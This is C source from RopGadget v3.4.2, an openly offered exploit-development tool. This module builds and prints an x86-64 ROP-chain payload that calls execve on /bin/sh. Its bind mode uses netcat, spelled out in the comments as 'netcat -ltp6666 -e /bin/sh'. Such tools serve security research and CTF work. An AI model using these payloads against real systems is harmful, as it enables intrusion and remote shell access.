/*
** RopGadget - Release v3.4.2
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** Allan Wirth - http://allanwirth.com/
** http://shell-storm.org
** 2012-11-11
**
** This program is free software; you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation; either version 2 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program; if not, write to the Free Software
** Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "ropgadget.h"

#define WORD 8

static void makepartie2(t_gadget *, int, int);

/* local: partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
void x8664_makecode(t_gadget *gadgets)
{
  int argv_start;
  int envp_start;
  t_rop_writer wr;
  char *second_reg;
  char reg_stack[32] = "pop %"; /* Whatever register we use to point to .data */
  char **argv;
  size_t i;

  wr.zero_data = &gadgets[6];
  wr.mov = &gadgets[7];
  wr.pop_data = &gadgets[8];

  second_reg = get_reg(wr.mov->inst, 0);
  strncat(reg_stack, second_reg, 3);
  free(second_reg);

  for (i = 8; i <= 11; i++)
    if (!strcmp(reg_stack, gadgets[i].inst))
      {
        wr.pop_target = &gadgets[i];
        break;
      }

  argv = get_argv();

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  if (!bind_mode.flag)
    fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);
  else
    fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);

  sc_print_argv((const char * const *)argv, &wr, 0, TRUE, WORD, &argv_start, &envp_start);

  free_argv(argv);

  makepartie2(gadgets, argv_start, envp_start);

  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
}

/* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
static void makepartie2(t_gadget *gadgets, int argv_start, int envp_start)
{
  int i;
  t_gadget *int_80 = &gadgets[0];
  t_gadget *sysenter = &gadgets[1];
  t_gadget *pop_ebp = &gadgets[2];
  t_gadget *xor_eax = &gadgets[6];
  t_gadget *pop_ebx = &gadgets[9];
  t_gadget *pop_ecx = &gadgets[10];
  t_gadget *pop_edx = &gadgets[11];
  t_gadget *inc_eax = &gadgets[3];

  for (i = 4; i < 6 && inc_eax->gadget == NULL; i++)
    inc_eax = &gadgets[i];

  /* set %ebx (program name) */
  sc_print_sect_addr_pop(pop_ebx, 0, TRUE, WORD);

  /* set %ecx (arguments) */
  sc_print_sect_addr_pop(pop_ecx, argv_start, TRUE, WORD);

  /* set %edx (environment) */
  sc_print_sect_addr_pop(pop_edx, envp_start, TRUE, WORD);

  /* set %eax => 0 */
  sc_print_solo_inst(xor_eax, WORD);

  /* set %eax => 0xb for sys_execve() */
  for (i = 0; i != 0xb; i++)
    sc_print_solo_inst(inc_eax, WORD);

  if (int_80->gadget)
    sc_print_solo_inst(int_80, WORD);
  else if (sysenter->gadget && pop_ebp->gadget)
    {
      sc_print_sect_addr_pop(pop_ebp, 0, TRUE, WORD);
      sc_print_solo_inst(sysenter, WORD);
    }
}
